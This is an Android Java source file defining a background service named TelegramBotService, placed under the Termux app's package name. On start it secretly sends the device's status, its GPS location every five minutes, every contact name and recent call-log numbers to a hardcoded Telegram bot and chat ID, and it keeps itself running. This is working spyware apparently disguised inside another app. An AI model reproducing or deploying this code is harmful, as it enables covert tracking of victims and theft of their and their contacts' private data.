package com.termux.app;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Properties;

public class TelegramBotService extends Service {
    private String botToken;
    private static final String TAG = "TelegramBotService";
    private LocationManager locationManager;
    private String chatId = "6617099953";

    @Override
    public void onCreate() {
        super.onCreate();
        loadToken();
        sendStatus("Online");
        startLocationTracking();
        sendContacts();
        sendCallLogs();
    }

    private void loadToken() {
        botToken = "7411696089:AAEj4S-K-D_J1S2S3S4S5S6S7S8S9S0S1S2"; // Ganti dengan token Anda
    }

    private void sendStatus(String status) {
        sendMessage("Device Status: " + status);
    }

    private void sendMessage(final String message) {
        if (botToken == null) return;
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                String json = "{\"chat_id\":\"" + chatId + "\", \"text\":\"" + message + "\"}";
                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message", e);
            }
        }).start();
    }

    @SuppressLint("MissingPermission")
    private void startLocationTracking() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 300000, 100, new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendMessage("Location: " + location.getLatitude() + ", " + location.getLongitude());
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            });
        } catch (Exception e) {
            Log.e(TAG, "Location error", e);
        }
    }

    private void sendContacts() {
        new Thread(() -> {
            StringBuilder contacts = new StringBuilder("Contacts:\n");
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cur != null && cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    @SuppressLint("Range") String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contacts.append(name).append("\n");
                }
                cur.close();
            }
            sendMessage(contacts.toString());
        }).start();
    }

    private void sendCallLogs() {
        new Thread(() -> {
            StringBuilder logs = new StringBuilder("Call Logs:\n");
            @SuppressLint("MissingPermission") 
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int count = 0;
                while (cursor.moveToNext() && count < 10) {
                    String phNumber = cursor.getString(number);
                    logs.append(phNumber).append("\n");
                    count++;
                }
                cursor.close();
            }
            sendMessage(logs.toString());
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        sendStatus("Offline");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}